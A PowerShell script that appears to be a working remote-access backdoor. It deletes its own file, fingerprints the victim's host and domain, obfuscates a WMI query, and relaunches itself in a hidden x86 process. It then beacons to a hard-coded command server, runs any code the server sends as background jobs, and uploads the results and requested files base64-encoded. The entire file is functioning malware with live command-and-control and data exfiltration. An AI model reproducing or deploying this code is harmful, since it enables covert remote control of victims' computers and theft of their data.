#region helper functions
function Out-Debug([String]$theMsg) {
    try {
        if ($WithDebug) {
            if ([String]::IsNullOrEmpty($LogFile)) { "[DEBUG] " + $theMsg | Out-Default }
            else { "[DEBUG] " + $theMsg | Add-Content $LogFile }
       }
    } catch {}
}
function Get-BiosSerial() {
    $sn = "BIOS UNKNOWN"
    $_sn = ""
    try {
	    $_q = "S!ELE!CT S!eri!al Nu!mb!er F!ROM! Wi!n32!BIO!S"
        $mSearcher = Get-WmiObject -Query ($_q -replace '!', "") -ea SilentlyContinue
        if ($mSearcher) {
            foreach ($o in $mSearcher) {
                if ($o.Properties.Name -eq "SerialNumber") {
                    $_sn = $o.Properties.Value
                }
            }
        }
    }
    catch {}
    if ([String]::IsNullOrEmpty($_sn) -eq $false) { $sn = $_sn }
    return "$sn";
}
function Convert-ToBase64([string] $theSource) {
    return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($theSource))
}
function Convert-FromBase64([string] $theSource) {
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($theSource))
}

function Check-SecondCopy([string] $uniqueId) {
    $secondCopy = $false
    try {
        $null = [Threading.Semaphore]::OpenExisting($uniqueId)
        $secondCopy = $true
    } catch {
        $script:Semaphore = New-Object Threading.Semaphore(0, 1, $uniqueId)
    }
    return $secondCopy
}
#endregion

#region Console Exchange
Function Send-ToConsole([String] $theAnswer) {
    if ([String]::IsNullOrEmpty($theAnswer)) { return }

    $_rc = ""
    try {
        $_wc = New-Object System.Net.WebClient
        $_wc.QueryString.Add("id", $script:myID)
        $_wc.Headers.Add("Content-type", "text/html")
        $_wc.Headers.Add("Accept", "text/html")
        $_rc = $_wc.UploadString($urlConsole, $theAnswer)

        $Connected = $true

        Out-Debug "Recieved from console:`n'$($_rc)'"
        return ($_rc, "")
    }
    catch {
        $_err = $_.ToString()
        Out-Debug "Console exchange error:`n$($_err)`nHTTP Error: $($_rc)"
        if (-not $Connected) {
          $script:FailCount = $script:FailCount - 1
          Out-Debug "[!] No console available! $script:FailCount attempts left."
          if ($script:FailCount -eq 0) {
            Out-Debug "[!] No console available! Exiting..."
            Exit
          }
        }
        return ("", $_err)
    }
}
#endregion

#region Initialization
function Remove-Myself($progFile) {
    if ($progFile) {
        if ((Test-Path $progFile) -eq $true) {
	        Remove-Item $progFile -Force -ErrorAction SilentlyContinue
        }
    }
}

function Init-Myself {
    $_os = Get-WmiObject Win32_OperatingSystem -ea SilentlyContinue
    if ($_os) {
        $myOSVersion = $_os.Caption + " " + $_os.Version
    } else {
        $myOSVersion = 'OS Unknown due to WMI error'
    }
    $myUserName = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $myHostName = $_os.CSName

    $_sn = Get-BiosSerial
    $_id = "$($myHostName)_$($myUserName)_$($_sn)_$($GroupID)"
    $_id = [Regex]::Replace($_id, "[^a-zA-Z0-9]", "")
    $isSecondCopy = Check-SecondCopy $_id
    $script:myID = "$_id-$($script:myVer)"

    $myDomain = "Host is not a member of domain"
    $_cs = Get-WmiObject -Class Win32_ComputerSystem -ea SilentlyContinue
    if ($_cs) {
        if ($_cs.PartOfDomain -eq $true) { $myDomain = $_cs.Domain }
    } else {
        $myDomain = 'Domain Unknown due to WMI error'
    }

    if ([IntPtr]::Size -eq 8) { $Bitness = "x64" } else { $Bitness = "x32" }
    
    if ($isSecondCopy) {
        Out-Debug "It's a second copy. Terminating"
        Remove-Myself
        #$_startinfo = (Convert-ToBase64 "INIT") + "`n" + (Convert-ToBase64 "SECOND-COPY")
        #($_result, $_error) = Send-ToConsole $_startinfo
        [Environment]::Exit(1)
    } else {
        Out-Debug "It's a first copy. Sending initial info"
        $_ln1 = (Convert-ToBase64 "INIT")
        $_ln3 = "$myOSVersion|$myHostName|$myDomain|$myUserName|$GroupID|$Bitness"
        $_ln2 = (Convert-ToBase64 $_ln3)
        ($_result, $_error) = Send-ToConsole ($_ln1 + "`n" + $_ln2)
    }

    Out-Debug "ver.$($script:myVer) Init complete"
    Out-Debug "urlConsole = '$urlConsole'  Interval = $Interval  Portable = $RunPortable  WithDebug = $WithDebug  LogFile = '$LogFile'  GroupID = '$GroupID'"
}

function Restart-Myself([string] $myCode) {
    $ps86 = "$($env:SystemRoot)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    $psArgs = "-"
    if (-not [io.file]::Exists($ps86)) { return $false }
    #$psCode = '"Hello, World!" > "c:\tmp\start-ps32.debug"'

    Out-Debug "Restarting in x86 mode"
    $psi = New-Object System.Diagnostics.ProcessStartInfo -Prop @{
        RedirectStandardInput = $True
        UseShellExecute = $False
        FileName = $ps86
        Arguments = $psArgs
        WindowStyle = "Hidden"
    }
    
    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = $psi
    $p.Start()
    $p.StandardInput.WriteLine($myCode)
    $p.StandardInput.Close()
    return $true
}
#endregion

#region Task Control
function Run-Command([String] $theConsoleCmd) {
    # unpack console command
    $_cc = $theConsoleCmd.Split("`n")
    for ($i = 0; $i -lt $_cc.Length; $i++ ) {
        $_cc[$i] = Convert-FromBase64($_cc[$i])
    }

    # execute console command
    $_dbg = "Command: " + $_cc[0] + " for: " + $_cc[1]
    Out-Debug $_dbg
    switch ($_cc[0]) {
        "STOP"  {
            Get-Job | % { Remove-Job -Job $_ -Force -ErrorAction SilentlyContinue }
            $_l1 = Convert-ToBase64("STOPACK")
            if ($_cc.Length -ge 2) { $_l2 = Convert-ToBase64($_cc[1]) }
            else { $_l2 = Convert-ToBase64("Nothing") }
            $_msg = $_l1, $_l2 -join "`n"
            ($_result, $_error) = Send-ToConsole $_msg

            $key = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, [Microsoft.Win32.RegistryView]::Registry64)
            $subKey =  $key.OpenSubKey("SOFTWARE\Microsoft\Cryptography")
            $mGUID = $subKey.GetValue("MachineGuid")
            # $mGUID = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Cryptography 'MachineGuid').MachineGuid
            $mName = ([BitConverter]::ToString((New-Object -TypeName Security.Cryptography.MD5CryptoServiceProvider).ComputeHash((New-Object -TypeName Text.UTF8Encoding).GetBytes($mGUID)))).Replace("-","")
            $mUtex = New-Object System.Threading.Mutex($false, "Global\$mName")
            Out-Debug "Exiting. Mutex name: 'Global\$mName'"
            Start-Sleep 5

            exit
        }
        "KILL"  { 
            if ($_cc.Length -lt 2) { return $false }
            Remove-Job -Name $_cc[1] -Force -ErrorAction SilentlyContinue
            $_l1 = Convert-ToBase64("KILLACK")
            $_l2 = Convert-ToBase64($_cc[1])
            $_msg = $_l1, $_l2 -join "`n"
            ($_result, $_error) = Send-ToConsole $_msg
            break 
        }
        "RUN"   {
            Out-Debug "New task Name: '$($_cc[1])'"
            Out-Debug "Running task(s):"
            Get-Job | % { Out-Debug "- $($_.Name)"}

            if ($_cc.Length -lt 3) { return $false }
            $_exists = Get-Job -Name $_cc[1] -ErrorAction SilentlyContinue
            if ($null -eq $_exists) {
                try {
                    $_code = "'STARTED'`n" + $_cc[2]
                    $_sc = [scriptblock]::Create($_code)

                    Out-Debug "Start task with Name: $($_cc[1])"

                    $null = Start-Job -Name $_cc[1] -ScriptBlock $_sc
                } catch {
                    $_l1 = Convert-ToBase64("FAILED")
                    $_l2 = Convert-ToBase64($_cc[1])
                    $_l3 = Convert-ToBase64("=====Start-Job Critical Error=====`rException: " + $_.exception.message)
                    $_msg = $_l1, $_l2, $_l3 -join "`n"
                    ($_result, $_error) = Send-ToConsole $_msg
                }
            }
        }
    }

}

function Get-TaskOutput($theJob) {
    $_out = $_wrn = $_err = ""
    try {
        $error.clear()
        $_out = (Receive-Job -Job $theJob -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-String)
        $_wrn = $theJob.ChildJobs[0].Error
        $theJob.ChildJobs[0].Error.Clear()

        while ($_out -match "(?m)------FILE:.+\n>>>(.+)<<<\n------FILEEND:.+\n") {
            $attFile = $Matches[1]
            if (Test-Path $attFile) {
                try {
                    $attBody = [io.file]::ReadAllBytes($attFile)
                } catch {
                    $attBody = [text.Encoding]::UTF8.GetBytes("Error: can not read attachment file '$attFile'`n" + $_.ToString())
                }
                Remove-Item $attFile -Force -ea SilentlyContinue
            } else {
                $attBody = [text.Encoding]::UTF8.GetBytes("Error: file does not exists '$attFile'")
            }
            $_out = $_out.Replace(">>>$($attFile)<<<", [convert]::ToBase64String($attBody))
        }
    }
    catch {
        $_err = $error[0]
        $error.Clear()
    }

    if ($false -eq [String]::IsNullOrEmpty($_wrn)) {
        $_out += "`n=====Warnings:=====`n" + $_wrn
    }
    if ($false -eq [String]::IsNullOrEmpty($_err)) {
        $_out += "`n======Errors:======`n" + $_err
    }

    return $_out
}

function Check-Tasks {
    Get-Job | % {
        $_job = $_
        if ("Completed", "Failed", "Stopped" -contains $_job.State) {
            $_dbg = "Status: " + $_job.State + " for: " + $_job.Name
            Out-Debug $_dbg
            $_taskOut = Get-TaskOutput $_job

            $_l1 = Convert-ToBase64($_job.State.ToString().ToUpper())
            $_l2 = Convert-ToBase64($_job.Name)
            $_l3 = Convert-ToBase64($_taskOut)
            $_msg = $_l1, $_l2, $_l3 -join "`n"
            
            ($_result, $_error) = Send-ToConsole $_msg
            Remove-Job -Name $_job.Name -Force -ErrorAction SilentlyContinue
        } else {
            $_taskOut = Get-TaskOutput $_job
            if ([String]::IsNullOrEmpty($_taskOut)) { return }

            $_dbg = "PARTIAL: " + $_job.State + " for: " + $_job.Name
            Out-Debug $_dbg
            $_l1 = Convert-ToBase64("PARTIAL")
            $_l2 = Convert-ToBase64($_job.Name)
            $_l3 = Convert-ToBase64($_taskOut)
            $_msg = $_l1, $_l2, $_l3 -join "`n"
            
            ($_result, $_error) = Send-ToConsole $_msg
        }
    }
}
#endregion

#region parameters parsing
$script:myVer = "0.025"
$LogFile = ''

$WithDebug = 'false'
if ($WithDebug -like '*%DEBUG%*') {
    $WithDebug = $false 
}
else {
    $WithDebug = [convert]::ToBoolean($WithDebug) 
}

$urlConsole = "https://myshortbio.com/Ghtyjh54tgwfgrth4eeGRjrgw212t67"
if ($urlConsole -like '*%URL%*') {
    Out-Debug "Module is uninitialized: urlConsole is '$urlConsole'"
    exit
}

$RunPortable = 'false'
if ($RunPortable -like '*%PORTABLE%*') {
    $RunPortable = $false 
}
else {
    $RunPortable = [convert]::ToBoolean($RunPortable) 
}

$Interval = '60'
if ($Interval -like '*%INTERVAL%*') { 
    $Interval = 60 
}
else {
    $Interval = [convert]::ToInt32($Interval) 
}

$GroupID = 't2ITYlbXUS'
if ($GroupID -like '*%GROUP%*') { $GroupID = '' }

$script:WarningPreference = "SilentlyContinue"
$script:VerbosePreference = "SilentlyContinue"
[Threading.Semaphore] $script:Semaphore = $null
$_debCnt = 0

$ModeX86 = 'true'
if ($ModeX86 -like '*%ModeX86%*') {
    $ModeX86 = $true 
}
else {
    $ModeX86 = [convert]::ToBoolean($ModeX86) 
}

$DomainOnly = 'true'
if ($DomainOnly -like '*%DomainOnly%*') {
  $DomainOnly = $true 
}
else {
  $DomainOnly = [convert]::ToBoolean($DomainOnly) 
}
#endregion

# -- initialization
if (-not $RunPortable) {
    Remove-Myself $script:myInvocation.MyCommand.Path
}

if ($DomainOnly) {
  if (-not ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain)) {
    Out-Debug "Current host $($env:COMPUTERNAME) is not a member of domain and can't be used for LDAP search"
    exit
  }
}

if ($ModeX86) {
    if ([IntPtr]::Size -eq 8) { 
        if (Restart-Myself $MyInvocation.MyCommand.ScriptBlock.ToString()) { exit }
        Out-Debug "Current mode is x64"
    } else {
        Out-Debug "Current mode is x86"
    }
}

$Connected = $false
$script:FailCount = 10
Init-Myself

# -- Start
while ($true) {
    $_nextStart = (Get-Date).AddSeconds($Interval)

    # query console for job
    $_tl =  ""
    Get-Job | % { $_tl += $_.Name + "|" }
    $_tl = $_tl.TrimEnd("|")

    $_debCnt += 1
    if ($_debCnt % 100 -eq 1) {
        $_dbg = "QUERY Console (Loop#$_debCnt). TaskList: " + $_tl
        Out-Debug $_dbg
    }

    $_query = (Convert-ToBase64 "QUERY") + "`n" + (Convert-ToBase64 $_tl)
    ($_task, $_err) = Send-ToConsole $_query
    if (([String]::IsNullOrEmpty($_err) -eq $true) -and ([String]::IsNullOrEmpty($_task) -eq $false)) { 
        Run-Command $_task
    }

    Out-Debug "Next loop at $($_nextStart.ToString())"
    while ((Get-Date) -le $_nextStart) {
        Start-Sleep -sec 1
        Check-Tasks
    }
}
